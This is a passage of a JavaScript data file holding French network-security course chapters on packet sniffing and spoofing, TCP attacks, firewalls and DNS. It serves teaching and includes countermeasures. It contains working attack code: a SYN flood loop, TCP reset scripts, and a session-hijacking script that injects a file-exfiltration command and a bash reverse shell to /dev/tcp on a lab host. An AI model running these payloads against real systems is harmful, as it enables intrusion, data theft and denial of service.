const ch15={id:"ch15",num:15,icon:"🔍",title:"Capture et Falsification de Paquets",desc:"Deux attaques fondamentales : sniffing (écoute) et spoofing (falsification). Implémentation avec pcap, raw sockets et Scapy.",sections:[
    {id:"s15_1",short:"15.1 Réception",title:"15.1 Comment les paquets sont reçus",content:"<div class=\"prose\">\n<p>La <strong>NIC (Network Interface Card)</strong> est un lien physique entre une machine et le réseau. Chaque NIC a une adresse MAC unique. Les réseaux Ethernet/WiFi sont des médias partagés&nbsp;: chaque NIC entend toutes les trames.</p>\n<p>Quand une trame arrive, la NIC vérifie l'adresse destination&nbsp;: si elle correspond, la trame est copiée dans le Ring Buffer noyau via DMA. Le CPU est interrompu et traite le paquet.</p>\n<h3 class=\"sub\">Mode Promiscuous</h3>\n<p>Normalement la NIC rejette les trames non destinées à elle. En <strong>mode promiscuous</strong>, elle transmet TOUS les paquets reçus au noyau — permet d'écouter tout le trafic réseau. Requiert les droits root.</p>\n<h3 class=\"sub\">Mode Monitor (WiFi)</h3>\n<p>Équivalent du mode promiscuous pour WiFi. Capture les trames 802.11 sur le canal écouté. Attention : les autres canaux ne sont pas capturés.</p>\n<h3 class=\"sub\">BSD Packet Filter (BPF)</h3>\n<p>Le <strong>BPF</strong> permet à un programme d'attacher un filtre à un socket, disant au noyau de rejeter les paquets indésirables tôt. Le filtre est écrit en expressions booléennes lisibles, compilé en pseudo-code BPF.</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Filtre BPF attaché à un socket</div>\n<pre>// Attacher le filtre BPF au socket :\nsetsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &amp;bpf, sizeof(bpf));\n// Une fois installé, le noyau invoque le BPF pour chaque paquet reçu.\n// Packets correspondants au filtre sont passés ; les autres sont jetés.</pre></div>"},
    {id:"s15_2",short:"15.2 Sniffing",title:"15.2 Capture de Paquets (Sniffing)",content:"<div class=\"prose\">\n<p>La capture de paquets consiste à intercepter les données en transit sur le réseau. Utilisée par les administrateurs pour diagnostiquer et par les attaquants pour la reconnaissance.</p>\n<h3 class=\"sub\">15.2.1 Réception normale (socket UDP)</h3>\n<p>Un programme UDP classique ne reçoit que les paquets qui lui sont destinés (IP + port correspondants).</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Serveur UDP (udp_server.c)</div>\n<pre>void main() {\n    struct sockaddr_in server;\n    char buf[1500];\n    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);\n    server.sin_family = AF_INET;\n    server.sin_addr.s_addr = htonl(INADDR_ANY);\n    server.sin_port = htons(9090);\n    bind(sock, (struct sockaddr*)&amp;server, sizeof(server));\n    while(1) {\n        recvfrom(sock, buf, 1499, 0, ...);\n        printf(\"%s\\n\", buf);\n    }\n}</pre></div>\n<div class=\"prose\">\n<h3 class=\"sub\">15.2.2 Sniffing avec Raw Sockets</h3>\n<p>Un sniffer doit capturer TOUS les paquets, sans restriction. Cela se fait via un <strong>socket brut (SOCK_RAW)</strong>.</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Capture via socket brut (sniff_raw.c)</div>\n<pre>int main() {\n    // Créer le socket brut : reçoit tous les protocoles\n    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));\n    // Activer le mode promiscuous\n    struct packet_mreq mr;\n    mr.mr_type = PACKET_MR_PROMISC;\n    setsockopt(sock, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &amp;mr, sizeof(mr));\n    // Boucle de capture\n    while(1) {\n        int n = recvfrom(sock, buffer, PACKET_LEN, 0, ...);\n        if(n) printf(\"Paquet recu !\\n\");\n    }\n}</pre></div>\n<div class=\"prose\">\n<h3 class=\"sub\">15.2.3 Sniffing avec l'API pcap</h3>\n<p>L'API <strong>pcap (libpcap)</strong> offre une interface portable et efficace. Elle inclut un compilateur de filtres lisibles en pseudo-code BPF. Compilation&nbsp;: <code>gcc -o sniff sniff.c -lpcap</code></p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Capture avec libpcap (sniff.c)</div>\n<pre>#include &lt;pcap.h&gt;\nvoid got_packet(u_char *args, const struct pcap_pkthdr *hdr,\n                const u_char *pkt) {\n    printf(\"Paquet capture !\\n\");\n}\nint main() {\n    pcap_t *handle;\n    char errbuf[PCAP_ERRBUF_SIZE];\n    struct bpf_program fp;\n    char filter[] = \"ip proto icmp\";  // Filtre : ICMP seulement\n    handle = pcap_open_live(\"enp0s3\", BUFSIZ, 1, 1000, errbuf);\n    pcap_compile(handle, &amp;fp, filter, 0, 0);\n    pcap_setfilter(handle, &amp;fp);\n    pcap_loop(handle, -1, got_packet, NULL); // Boucle infinie\n    pcap_close(handle);\n}</pre></div>\n<div class=\"info-box warn\"><div class=\"ib-title\">Exemples de filtres pcap</div>\n<ul>\n<li><code>dst host 10.0.2.5</code> — Paquets destinés à 10.0.2.5</li>\n<li><code>src host 10.0.2.6</code> — Paquets venant de 10.0.2.6</li>\n<li><code>proto tcp</code> — Paquets TCP uniquement</li>\n<li><code>host 10.0.2.6 and src port 9090</code> — Combinaison IP + port</li>\n</ul></div>\n<div class=\"prose\">\n<h3 class=\"sub\">15.2.4 Analyse du paquet capturé</h3>\n<p>On utilise le <strong>cast de structures</strong> pour analyser les en-têtes&nbsp;:</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Analyse IP dans got_packet</div>\n<pre>void got_packet(u_char *args, const struct pcap_pkthdr *hdr,\n                const u_char *pkt) {\n    struct ethheader *eth = (struct ethheader *)pkt;\n    if(ntohs(eth-&gt;ether_type) == 0x0800) { // Paquet IP\n        struct ipheader *ip = (struct ipheader *)\n                              (pkt + sizeof(struct ethheader));\n        printf(\"De   : %s\\n\", inet_ntoa(ip-&gt;iph_sourceip));\n        printf(\"Vers : %s\\n\", inet_ntoa(ip-&gt;iph_destip));\n        switch(ip-&gt;iph_protocol) {\n            case IPPROTO_TCP:  printf(\"TCP\\n\");  break;\n            case IPPROTO_UDP:  printf(\"UDP\\n\");  break;\n            case IPPROTO_ICMP: printf(\"ICMP\\n\"); break;\n        }\n    }\n}</pre></div>"},
    {id:"s15_3",short:"15.3 Spoofing",title:"15.3 Falsification de Paquets",content:"<div class=\"prose\">\n<p>Le <strong>spoofing</strong> consiste à envoyer des paquets avec des informations forgées. Avec la programmation socket classique, on ne contrôle que quelques champs (ex: IP dest). Pour falsifier l'IP source, il faut un <strong>socket brut (SOCK_RAW)</strong>.</p>\n<h3 class=\"sub\">15.3.2 Envoi avec Raw Socket</h3>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Envoi d'un paquet IP brut</div>\n<pre>void send_raw_ip_packet(struct ipheader *ip) {\n    struct sockaddr_in dest_info;\n    int enable = 1;\n    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);\n    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &amp;enable, sizeof(enable));\n    dest_info.sin_family = AF_INET;\n    dest_info.sin_addr = ip-&gt;iph_destip;\n    sendto(sock, ip, ntohs(ip-&gt;iph_len), 0,\n           (struct sockaddr*)&amp;dest_info, sizeof(dest_info));\n    close(sock);\n}</pre></div>\n<div class=\"info-box danger\"><div class=\"ib-title\">Privileges root requis</div>\n<p>Seuls les processus root ou CAP_NET_RAW peuvent créer des sockets bruts. Utiliser <code>sudo</code>.</p></div>\n<div class=\"prose\"><h3 class=\"sub\">15.3.3 Paquet ICMP falsifié</h3></div>\n<div class=\"code-block\"><div class=\"code-label\">ICMP avec IP source falsifiée (spoof_icmp.c)</div>\n<pre>int main() {\n    char buffer[1500]; memset(buffer, 0, 1500);\n    // Etape 1 : En-tete ICMP\n    struct icmpheader *icmp =\n        (struct icmpheader *)(buffer + sizeof(struct ipheader));\n    icmp-&gt;icmp_type = 8; // Echo Request\n    icmp-&gt;icmp_chksum = in_cksum((unsigned short*)icmp,\n                                   sizeof(struct icmpheader));\n    // Etape 2 : En-tete IP\n    struct ipheader *ip = (struct ipheader*)buffer;\n    ip-&gt;iph_ver = 4; ip-&gt;iph_ihl = 5; ip-&gt;iph_ttl = 20;\n    ip-&gt;iph_sourceip.s_addr = inet_addr(\"1.2.3.4\"); // IP FALSIFIEE\n    ip-&gt;iph_destip.s_addr   = inet_addr(\"10.0.2.69\");\n    ip-&gt;iph_protocol = IPPROTO_ICMP;\n    ip-&gt;iph_len = htons(sizeof(struct ipheader) +\n                         sizeof(struct icmpheader));\n    // Etape 3 : Envoyer\n    send_raw_ip_packet(ip);\n}</pre></div>"},
    {id:"s15_4",short:"15.4 Sniff+Spoof",title:"15.4 Capture puis Falsification",content:"<div class=\"prose\">\n<p>En combinant sniffing et spoofing, on peut capturer une requête et envoyer immédiatement une réponse falsifiée. C'est la base de nombreuses attaques réseau.</p>\n<p><strong>Exemple&nbsp;:</strong> capturer les paquets UDP sur le port 9999 et envoyer une réponse falsifiée.</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Sniff + Spoof UDP</div>\n<pre>void spoof_reply(struct ipheader *ip) {\n    int ip_hlen = ip-&gt;iph_ihl * 4;\n    struct udpheader *udp = (struct udpheader*)((u_char*)ip + ip_hlen);\n    if(ntohs(udp-&gt;udp_dport) != 9999) return;\n    // Copier le paquet original\n    char buffer[1500]; memcpy(buffer, ip, ntohs(ip-&gt;iph_len));\n    struct ipheader  *newip  = (struct ipheader*)buffer;\n    struct udpheader *newudp = (struct udpheader*)(buffer + ip_hlen);\n    char *data = (char*)newudp + sizeof(struct udpheader);\n    const char *msg = \"Reponse falsifiee !\\n\";\n    strncpy(data, msg, strlen(msg));\n    // Inverser source/destination\n    newudp-&gt;udp_sport = udp-&gt;udp_dport;\n    newudp-&gt;udp_dport = udp-&gt;udp_sport;\n    newip-&gt;iph_sourceip = ip-&gt;iph_destip;\n    newip-&gt;iph_destip   = ip-&gt;iph_sourceip;\n    send_raw_ip_packet(newip);\n}</pre></div>\n<div class=\"info-box ok\"><div class=\"ib-title\">Resultat</div>\n<pre>$ nc -u 1.2.3.4 9999\naaa\nReponse falsifiee !</pre>\n<p>La réponse arrive même si 1.2.3.4 n'existe pas réellement.</p></div>"},
    {id:"s15_5",short:"15.5 Scapy",title:"15.5 Python et Scapy",content:"<div class=\"prose\">\n<p><strong>Scapy</strong> est un outil Python puissant pour manipuler les paquets réseau. Beaucoup plus simple que le C, mais ~37x plus lent.</p>\n<h3 class=\"sub\">Sniffing</h3>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Sniffer ICMP (sniff.py)</div>\n<pre>from scapy.all import *\n\ndef print_pkt(pkt):\n    print(\"Src:\", pkt[IP].src, \"Dst:\", pkt[IP].dst,\n          \"Proto:\", pkt[IP].proto)\n\npkt = sniff(filter='icmp', prn=print_pkt)</pre></div>\n<div class=\"prose\"><h3 class=\"sub\">Spoofing ICMP</h3></div>\n<div class=\"code-block\"><div class=\"code-label\">Spoofing ICMP avec Scapy</div>\n<pre>from scapy.all import *\nip   = IP(src=\"1.2.3.4\", dst=\"93.184.216.34\")\nicmp = ICMP()   # type=8 (echo request) par defaut\npkt  = ip / icmp\nsend(pkt, verbose=0)</pre></div>\n<div class=\"prose\"><h3 class=\"sub\">Spoofing UDP</h3></div>\n<div class=\"code-block\"><div class=\"code-label\">Spoofing UDP avec Scapy</div>\n<pre>from scapy.all import *\nip   = IP(src=\"1.2.3.4\", dst=\"10.0.2.69\")\nudp  = UDP(sport=8888, dport=9090)\ndata = \"Bonjour UDP !\"\npkt  = ip / udp / data\nsend(pkt, verbose=0)</pre></div>\n<div class=\"prose\"><h3 class=\"sub\">Sniff + Spoof ICMP automatique</h3></div>\n<div class=\"code-block\"><div class=\"code-label\">Sniff + Spoof ICMP (sniff_spoof_icmp.py)</div>\n<pre>from scapy.all import *\n\ndef spoof_pkt(pkt):\n    if ICMP in pkt and pkt[ICMP].type == 8:\n        ip   = IP(src=pkt[IP].dst, dst=pkt[IP].src)\n        icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)\n        newpkt = ip / icmp / pkt[Raw].load\n        send(newpkt, verbose=0)\n\nsniff(filter='icmp and src host 10.0.2.69', prn=spoof_pkt)</pre></div>"},
    {id:"s15_6",short:"15.6-9 Avancé",title:"15.6-9 Hybride, Endianness, Checksum",content:"<div class=\"prose\">\n<h3 class=\"sub\">15.6 Approche Hybride Scapy + C</h3>\n<p>Scapy = pratique mais lent (106 paquets/s). C = rapide (4000 paquets/s). Approche hybride&nbsp;:</p>\n<ol>\n<li>Créer un paquet modèle avec Scapy, sauvegarder en fichier binaire</li>\n<li>Charger dans un programme C, modifier les champs variables, envoyer à grande vitesse</li>\n</ol>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Template Scapy (generate_udp.py)</div>\n<pre>from scapy.all import *\npkt = IP(dst='10.0.2.69', chksum=0) / UDP(dport=53, chksum=0)\nwith open('ip.bin', 'wb') as f:\n    f.write(bytes(pkt))</pre></div>\n<div class=\"code-block\"><div class=\"code-label\">Envoyer vite en C</div>\n<pre>FILE *f = fopen(\"ip.bin\", \"rb\");\nfread(ip, 1, MAX_FILE_SIZE, f);\nfor(int i=1; i&lt;1000; i++) {\n    // Modifier IP source (offset 12) et port source (offset 20)\n    unsigned int src_ip = htonl(rand());\n    memcpy(ip+12, &amp;src_ip, 4);\n    unsigned short src_port = htons(rand());\n    memcpy(ip+20, &amp;src_port, 2);\n    send_packet_raw(sock, ip, n);\n}</pre></div>\n<div class=\"prose\">\n<h3 class=\"sub\">15.7 Endianness</h3>\n<p>L'<strong>endianness</strong> = ordre de stockage des octets d'une valeur multi-octets en mémoire.</p>\n<ul>\n<li><strong>Big-Endian</strong>&nbsp;: octet le plus significatif à l'adresse la plus basse</li>\n<li><strong>Little-Endian</strong>&nbsp;: octet le plus significatif à l'adresse la plus haute (x86)</li>\n</ul>\n<p>L'IANA a défini l'<strong>ordre réseau = Big-Endian</strong>. Fonctions de conversion&nbsp;:</p>\n</div>\n<table class=\"dt\">\n<tr><th>Fonction</th><th>Conversion</th></tr>\n<tr><td><code>htons()</code></td><td>Hôte → Réseau (short, 2 octets)</td></tr>\n<tr><td><code>htonl()</code></td><td>Hôte → Réseau (long, 4 octets)</td></tr>\n<tr><td><code>ntohs()</code></td><td>Réseau → Hôte (short)</td></tr>\n<tr><td><code>ntohl()</code></td><td>Réseau → Hôte (long)</td></tr>\n</table>\n<div class=\"prose\">\n<h3 class=\"sub\">15.8 Checksum (Somme de contrôle)</h3>\n<p>Selon la RFC 1071, la somme de contrôle est le complément à 1 sur 16 bits de la somme des mots de 16 bits. La fonction <code>in_cksum()</code> implémente ce calcul. Pour TCP/UDP, un pseudo-en-tête incluant des champs IP est utilisé.</p>\n<h3 class=\"sub\">15.9 Résumé</h3>\n<p>Sniffing + spoofing = deux techniques fondamentales des attaques réseau. Sniffing via pcap ; spoofing via raw sockets. Combinés, ils permettent de nombreuses attaques&nbsp;: TCP session hijacking, DNS cache poisoning, Heartbleed.</p>\n</div>"}
]};
const ch16={id:"ch16",num:16,icon:"\u2694\ufe0f",title:"Attaques sur le Protocole TCP",desc:"SYN Flooding, TCP Reset et Session Hijacking — trois attaques classiques sur TCP.",sections:[
    {id:"s16_1",short:"16.1 Comment TCP fonctionne",title:"16.1 Fonctionnement de TCP",content:"<div class=\"prose\">\n<p>TCP (Transmission Control Protocol) fournit une communication <strong>fiable et ordonnée</strong>. La plupart des applications (navigateurs, SSH, email) utilisent TCP.</p>\n<p>TCP identifie chaque session par 4 champs&nbsp;: IP source, port source, IP destination, port destination.</p>\n<h3 class=\"sub\">En-tête TCP — champs clés</h3>\n</div>\n<table class=\"dt\">\n<tr><th>Champ</th><th>Taille</th><th>Description</th></tr>\n<tr><td>Numéro de séquence</td><td>32 bits</td><td>Position du 1er octet du segment dans le flux</td></tr>\n<tr><td>Numéro d'acquittement</td><td>32 bits</td><td>Prochain numéro attendu (si ACK=1)</td></tr>\n<tr><td>SYN / FIN / RST</td><td>1 bit each</td><td>Contrôle de connexion (ouverture/fermeture/reset)</td></tr>\n<tr><td>Fenêtre (Window)</td><td>16 bits</td><td>Contrôle de flux — octets acceptables</td></tr>\n</table>\n<div class=\"prose\"><h3 class=\"sub\">Transmission des données</h3>\n<p>Chaque octet a un numéro de séquence unique. Le récepteur acquitte en disant quel numéro il attend ensuite. Si un paquet est perdu, l'émetteur le retransmet. Les données arrivent ordonnées même si les paquets arrivent dans le désordre.</p></div>"},
    {id:"s16_2",short:"16.2 SYN Flooding",title:"16.2 Attaque SYN Flooding",content:"<div class=\"prose\">\n<h3 class=\"sub\">3-Way Handshake</h3>\n<ol>\n<li>Client → Serveur : <strong>SYN</strong> (numéro de séquence x aléatoire)</li>\n<li>Serveur → Client : <strong>SYN + ACK</strong> (numéro y aléatoire, ACK=x+1)</li>\n<li>Client → Serveur : <strong>ACK</strong> (ACK=y+1) — connexion établie</li>\n</ol>\n<p>À l'étape 1, le serveur stocke un TCB dans la <strong>file des connexions semi-ouvertes</strong> (half-open queue) — capacité limitée.</p>\n<h3 class=\"sub\">L'attaque SYN Flooding</h3>\n<p>L'attaquant envoie des milliers de SYN avec des <strong>IP sources aléatoires (falsifiées)</strong> sans jamais compléter le handshake. La file semi-ouverte se remplit → le serveur ne peut plus accepter de nouvelles connexions.</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Lancer l'attaque (netwox ou C)</div>\n<pre># Désactiver SYN cookies (contre-mesure) :\nsudo sysctl -w net.ipv4.tcp_syncookies=0\n\n# Attaque avec Netwox (tool 76) sur port telnet :\nsudo netwox 76 -i 10.0.2.69 -p 23 -s raw\n\n# Vérifier les connexions semi-ouvertes :\nnetstat -tna | grep SYN_RECV</pre></div>\n<div class=\"code-block\"><div class=\"code-label\">Spoofing SYN en C</div>\n<pre>while(1) {\n    tcp-&gt;tcp_sport  = rand();      // Port source aleatoire\n    tcp-&gt;tcp_dport  = htons(80);   // Cible : serveur web\n    tcp-&gt;tcp_seq    = rand();      // Sequence aleatoire\n    tcp-&gt;tcp_flags  = TH_SYN;     // Bit SYN active\n    ip-&gt;iph_sourceip.s_addr = rand(); // IP source aleatoire\n    tcp-&gt;tcp_sum = calculate_tcp_checksum(ip);\n    send_raw_ip_packet(ip);\n}</pre></div>\n<div class=\"info-box note\"><div class=\"ib-title\">Contre-mesure : SYN Cookies</div>\n<p>Le serveur encode les infos de connexion dans son numéro de séquence initial (le \"cookie\"). Il n'alloue aucune ressource avant de recevoir l'ACK final. Activé par défaut sous Ubuntu Linux.</p></div>"},
    {id:"s16_3",short:"16.3 TCP Reset",title:"16.3 Attaque TCP Reset",content:"<div class=\"prose\">\n<p>L'attaque <strong>TCP Reset</strong> brise une connexion existante en envoyant un paquet RST falsifié. Champs critiques à remplir correctement&nbsp;:</p>\n<ul>\n<li>IP source/dest + ports source/dest (identifiant la session)</li>\n<li><strong>Numéro de séquence</strong> — doit correspondre exactement à ce que le récepteur attend</li>\n</ul>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">TCP Reset manuel avec Scapy (reset.py)</div>\n<pre>from scapy.all import *\n# Infos récupérées dans Wireshark :\n# Source: 10.0.2.69:23 → Dest: 10.0.2.68:45634\n# Next seq: 2737422033\nIPLayer  = IP(src=\"10.0.2.69\", dst=\"10.0.2.68\")\nTCPLayer = TCP(sport=23, dport=45634, flags=\"R\", seq=2737422033)\npkt = IPLayer / TCPLayer\nsend(pkt, verbose=0)\n# Résultat : \"Connection closed by foreign host\"</pre></div>\n<div class=\"code-block\"><div class=\"code-label\">Reset automatique (streaming vidéo)</div>\n<pre>from scapy.all import *\n\ndef spoof_tcp(pkt):\n    ip  = IP(dst=\"10.0.2.68\", src=pkt[IP].dst)\n    tcp = TCP(flags=\"R\", seq=pkt[TCP].ack,\n              dport=pkt[TCP].sport, sport=pkt[TCP].dport)\n    send(ip/tcp, verbose=0)\n\nsniff(filter='tcp and src host 10.0.2.68', prn=spoof_tcp)</pre></div>\n<div class=\"info-box warn\"><div class=\"ib-title\">Note sur le numéro de séquence</div>\n<p>Si le numéro est trop petit → paquet rejeté. Si exact → connexion coupée. Les expériences sur Linux montrent une exigence stricte (exactement le numéro attendu).</p></div>"},
    {id:"s16_4",short:"16.4 Session Hijacking",title:"16.4 Détournement de Session TCP",content:"<div class=\"prose\">\n<p>Le <strong>détournement de session TCP</strong> permet d'injecter des données dans une connexion existante. Si l'attaquant usurpe un paquet avec la bonne signature (4 champs) ET le bon numéro de séquence, le récepteur l'accepte.</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Session Hijacking (sessionhijack.py)</div>\n<pre>from scapy.all import *\n# Infos depuis Wireshark (telnet User→Server) :\nIPLayer  = IP(src=\"10.0.2.68\", dst=\"10.0.2.69\")\nTCPLayer = TCP(sport=46716, dport=23, flags=\"A\",\n               seq=956606610, ack=3791760010)\n# Commande injectée dans le flux telnet :\nData = \"\\r cat /home/seed/secret &gt; /dev/tcp/10.0.2.70/9090 \\r\"\npkt  = IPLayer / TCPLayer / Data\nsend(pkt, verbose=0)\n# L'attaquant reçoit le fichier secret sur nc -lv 9090 !</pre></div>\n<div class=\"info-box danger\"><div class=\"ib-title\">Reverse Shell via Session Hijacking</div>\n<pre>Data = \"\\r /bin/bash -i &gt; /dev/tcp/10.0.2.70/9090 2&gt;&amp;1 0&lt;&amp;1 \\r\"\n# Explication :\n# /bin/bash -i       : shell interactif sur le serveur\n# &gt; /dev/tcp/x/p    : stdout vers connexion TCP vers l'attaquant\n# 2&gt;&amp;1               : stderr aussi vers stdout (= TCP)\n# 0&lt;&amp;1               : stdin depuis la meme connexion TCP\n# Resultat : shell complet controlé depuis la machine de l'attaquant !</pre></div>"},
    {id:"s16_5",short:"16.5 Résumé",title:"16.5 Résumé",content:"<table class=\"dt\">\n<tr><th>Attaque</th><th>Type</th><th>Cible</th><th>Contre-mesure</th></tr>\n<tr><td>SYN Flooding</td><td>DoS</td><td>File half-open</td><td>SYN cookies</td></tr>\n<tr><td>TCP Reset</td><td>Rupture de connexion</td><td>Session existante</td><td>Chiffrement réseau</td></tr>\n<tr><td>Session Hijacking</td><td>Injection de données</td><td>Session telnet/SSH</td><td>Chiffrement bout en bout</td></tr>\n</table>\n<div class=\"info-box note\"><div class=\"ib-title\">Leçon clé</div>\n<p>TCP = protocole conçu sans sécurité. Des améliorations ont été apportées (SYN cookies, randomisation des séquences) mais les problèmes fondamentaux persistent sans refonte du protocole.</p></div>"}
]};
const ch17={id:"ch17",num:17,icon:"\ud83d\udee1\ufe0f",title:"Pare-feu (Firewall)",desc:"Types de pare-feux (stateless/stateful/proxy), Netfilter, iptables et contournement via SSH.",sections:[
    {id:"s17_1",short:"17.1 Introduction",title:"17.1 Introduction",content:"<div class=\"prose\">\n<p>Un <strong>pare-feu</strong> filtre le trafic réseau entre zones de confiance. Peut être matériel, logiciel ou combiné.</p>\n<h3 class=\"sub\">Actions</h3>\n<ul>\n<li><strong>ACCEPT</strong> : le paquet traverse</li>\n<li><strong>DROP</strong> : rejeté silencieusement</li>\n<li><strong>REJECT</strong> : rejeté + notification ICMP à la source</li>\n</ul>\n<h3 class=\"sub\">Types de filtrage</h3>\n<ul>\n<li><strong>Ingress filtering</strong> : inspecte le trafic entrant (protection vs attaques ext.)</li>\n<li><strong>Egress filtering</strong> : inspecte le trafic sortant (ex. bloquer réseaux sociaux)</li>\n</ul></div>"},
    {id:"s17_2",short:"17.2 Types",title:"17.2 Types de Pare-feux",content:"<div class=\"prose\">\n<h3 class=\"sub\">Filtre de paquets (Stateless)</h3>\n<p>Décisions basées sur chaque paquet individuellement (IP, ports, protocole) sans contexte. <strong>Avantage</strong>&nbsp;: très rapide. <strong>Inconvénient</strong>&nbsp;: ne distingue pas un paquet légitime d'un paquet malveillant appartenant à la même plage.</p>\n<h3 class=\"sub\">Pare-feu à états (Stateful)</h3>\n<p>Suit l'état de toutes les connexions via une <strong>table d'état</strong>. N'autorise que les paquets appartenant à des connexions connues. Réduit considérablement les risques de spoofing.</p>\n<h3 class=\"sub\">Pare-feu Applicatif/Proxy</h3>\n<p>Inspecte jusqu'à la couche application. Agit comme intermédiaire. Plus lent mais plus sécurisé — peut analyser le contenu HTTP, bloquer des URL, etc.</p></div>"},
    {id:"s17_3",short:"17.3 Netfilter",title:"17.3-4 Netfilter — Implémentation",content:"<div class=\"prose\">\n<p><strong>Netfilter</strong> est le cadre noyau Linux permettant d'enregistrer des fonctions de rappel (hooks) qui s'exécutent pour chaque paquet réseau.</p>\n</div>\n<table class=\"dt\">\n<tr><th>Hook</th><th>Quand invoqué ?</th></tr>\n<tr><td>NF_INET_PRE_ROUTING</td><td>Tout paquet entrant (avant routage)</td></tr>\n<tr><td>NF_INET_LOCAL_IN</td><td>Paquet destiné à la machine locale</td></tr>\n<tr><td>NF_INET_FORWARD</td><td>Paquet à transférer</td></tr>\n<tr><td>NF_INET_LOCAL_OUT</td><td>Paquet sortant généré localement</td></tr>\n<tr><td>NF_INET_POST_ROUTING</td><td>Paquet prêt à partir (après routage)</td></tr>\n</table>\n<div class=\"code-block\"><div class=\"code-label\">Module noyau — Bloquer les paquets ICMP</div>\n<pre>static unsigned int hook_func(void *priv, struct sk_buff *skb,\n                               const struct nf_hook_state *state) {\n    struct iphdr *iph = ip_hdr(skb);\n    if(iph-&gt;protocol == IPPROTO_ICMP)\n        return NF_DROP;    // Bloquer ICMP\n    return NF_ACCEPT;      // Autoriser tout le reste\n}\nstatic struct nf_hook_ops hook_ops = {\n    .hook    = hook_func,\n    .pf      = PF_INET,\n    .hooknum = NF_INET_PRE_ROUTING,\n    .priority= NF_IP_PRI_FIRST,\n};</pre></div>"},
    {id:"s17_4",short:"17.5 iptables",title:"17.5 iptables Linux",content:"<div class=\"prose\">\n<p><strong>iptables</strong> est l'interface en espace utilisateur pour Netfilter. Il configure des règles via des <em>tables</em> et <em>chaînes</em>.</p>\n<ul>\n<li><strong>Tables</strong>&nbsp;: filter (par défaut), nat, mangle, raw</li>\n<li><strong>Chaînes</strong>&nbsp;: INPUT, OUTPUT, FORWARD</li>\n</ul>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Commandes iptables essentielles</div>\n<pre># Lister les règles :\nsudo iptables -L -n -v\n\n# Bloquer tout trafic depuis 10.0.2.68 :\nsudo iptables -A INPUT -s 10.0.2.68 -j DROP\n\n# Bloquer telnet sortant :\nsudo iptables -A OUTPUT -p tcp --dport 23 -j DROP\n\n# Autoriser SSH entrant :\nsudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT\n\n# Politique par défaut : tout bloquer\nsudo iptables -P INPUT DROP\n\n# Autoriser les réponses des connexions déjà établies :\nsudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT\n\n# Réinitialiser toutes les règles :\nsudo iptables -F</pre></div>"},
    {id:"s17_5",short:"17.6-9 Stateful/SSH",title:"17.6-9 Stateful, Proxy et Évasion",content:"<div class=\"prose\">\n<h3 class=\"sub\">17.6 Pare-feu à états (conntrack)</h3>\n<p>Le module <code>conntrack</code> suit l'état des connexions&nbsp;: NEW, ESTABLISHED, RELATED, INVALID.</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Pare-feu stateful</div>\n<pre># Autoriser nouvelles connexions HTTP sortantes :\niptables -A OUTPUT -p tcp --dport 80 -m conntrack --ctstate NEW -j ACCEPT\n# Autoriser les réponses correspondantes :\niptables -A INPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT</pre></div>\n<div class=\"prose\">\n<h3 class=\"sub\">17.8 Contournement — Tunnel SSH</h3>\n<p>Si le pare-feu bloque le port 23 (telnet) mais autorise le port 22 (SSH), on peut tunneliser telnet dans SSH pour contourner la règle&nbsp;:</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Tunnel SSH</div>\n<pre># Rediriger port local 8023 vers port 23 du serveur via SSH :\nssh -L 8023:10.0.2.69:23 user@10.0.2.69\n\n# Puis se connecter via le tunnel :\ntelnet 127.0.0.1 8023\n# Le trafic telnet est encapsulé dans SSH — le pare-feu ne voit que SSH !</pre></div>"}
]};
const ch18={id:"ch18",num:18,icon:"\ud83c\udf10",title:"DNS et Attaques DNS",desc:"Fonctionnement du DNS, empoisonnement de cache, attaque Kaminsky, DNS rebinding et DNSSEC.",sections:[
    {id:"s18_1",short:"18.1 Fonctionnement",title:"18.1 Fonctionnement du DNS",content:"<div class=\"prose\">\n<p>Le <strong>DNS (Domain Name System)</strong> traduit les noms de domaine (ex. www.example.com) en adresses IP. Architecture distribuée en 4 niveaux&nbsp;: racine → TLD → autoritaire → résolveur local.</p>\n</div>\n<table class=\"dt\">\n<tr><th>Type</th><th>Description</th><th>Exemple</th></tr>\n<tr><td>A</td><td>Nom → IPv4</td><td>example.com → 93.184.216.34</td></tr>\n<tr><td>AAAA</td><td>Nom → IPv6</td><td>example.com → 2606:…</td></tr>\n<tr><td>MX</td><td>Serveur de mail</td><td>mail.example.com</td></tr>\n<tr><td>NS</td><td>Serveur de noms</td><td>ns1.example.com</td></tr>\n<tr><td>CNAME</td><td>Alias</td><td>www → example.com</td></tr>\n</table>\n<div class=\"prose\"><h3 class=\"sub\">Processus de résolution</h3>\n<ol>\n<li>Client → Résolveur local (FAI)</li>\n<li>Résolveur → Serveur racine → TLD → Serveur autoritaire</li>\n<li>Résolveur retourne l'IP au client et la met en <strong>cache</strong> (selon le TTL)</li>\n</ol></div>"},
